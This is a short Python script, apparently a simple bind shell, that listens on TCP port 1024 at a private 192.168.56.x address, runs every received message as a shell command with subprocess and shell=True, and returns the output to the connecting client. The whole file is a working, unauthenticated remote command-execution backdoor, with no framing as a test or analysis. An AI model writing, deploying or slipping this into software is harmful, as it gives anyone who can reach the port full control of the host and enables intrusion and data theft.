import socket
import subprocess

#HOSTNAME = socket.gethostname()
#HOST = socket.gethostname(HOSTNAME)
HOST = "192.168.56.105"
PORT = 1024

while True:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	s.bind((HOST, PORT))
	s.listen(0)

	conn, addr = s.accept()

	data = conn.recv(1024)

	command = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,)
	stdoutValue, stderrValue = command.communicate()

	if stdoutValue:
		output = stdoutValue
	elif stderrValue:
		output = stderrValue
	elif not stdoutValue and not stderrValue:
		output = "successfull execution but no output\n"

	if not isinstance(output, bytes):
		output = output.encode()

	conn.sendall(output)
